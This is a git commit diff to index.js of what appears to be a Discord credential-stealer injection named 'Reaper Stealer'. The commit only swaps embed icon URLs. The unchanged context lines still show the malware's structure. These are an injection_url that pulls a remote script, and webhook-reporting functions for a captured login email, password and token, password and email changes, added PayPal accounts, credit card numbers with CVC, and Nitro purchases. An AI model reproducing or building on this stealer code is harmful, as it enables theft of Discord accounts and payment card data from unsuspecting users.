a71344854fb7eedd4b528f50e48f9e32c5571486
AizenWo <124543773+AizenWo@users.noreply.github.com>
2024-07-14 22:34:42 +0800

    Update index.js

--- index.js
+++ index.js
@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Reaper Stealer | Injection', 
-  embed_icon: 'https://cdn.discordapp.com/attachments/1261890856739409972/1262047642788040745/reaper.png?ex=66952cf5&is=6693db75&hm=ed10363019e2f7cb9a890774df6e3a0305a342d619f7b65e20450e02b758b906&'.replace(/ /g, '%20'), 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/AizenWo/Discord-Injection/main/index.js', 
   /**
@@ -681,7 +681,7 @@ const login = async (email, password, token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz ',
-            icon_url: "https://cdn.discordapp.com/attachments/1261890856739409972/1262047642788040745/reaper.png?ex=66952cf5&is=6693db75&hm=ed10363019e2f7cb9a890774df6e3a0305a342d619f7b65e20450e02b758b906&"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
     ],
@@ -724,7 +724,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1261890856739409972/1262047642788040745/reaper.png?ex=66952cf5&is=6693db75&hm=ed10363019e2f7cb9a890774df6e3a0305a342d619f7b65e20450e02b758b906&"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
     ],
@@ -767,7 +767,7 @@ const emailChanged = async (email, password, token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1261890856739409972/1262047642788040745/reaper.png?ex=66952cf5&is=6693db75&hm=ed10363019e2f7cb9a890774df6e3a0305a342d619f7b65e20450e02b758b906&"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
     ],
@@ -810,7 +810,7 @@ const PaypalAdded = async (token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1261890856739409972/1262047642788040745/reaper.png?ex=66952cf5&is=6693db75&hm=ed10363019e2f7cb9a890774df6e3a0305a342d619f7b65e20450e02b758b906&"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
     ],
@@ -853,7 +853,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1261890856739409972/1262047642788040745/reaper.png?ex=66952cf5&is=6693db75&hm=ed10363019e2f7cb9a890774df6e3a0305a342d619f7b65e20450e02b758b906&"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
     ],
@@ -898,7 +898,7 @@ const nitroBought = async (token) => {
         },
         footer: {
             text: 'Reaper Inject�on | Ba�Edemezsiniz',
-            icon_url: "https://cdn.discordapp.com/attachments/1261890856739409972/1262047642788040745/reaper.png?ex=66952cf5&is=6693db75&hm=ed10363019e2f7cb9a890774df6e3a0305a342d619f7b65e20450e02b758b906&"
+            icon_url: "https://cdn.discordapp.com/attachments/1059829665268768898/1084502872135315486/Picsart_22-10-09_19-38-18-617.jpg"
         },
       },
     ],
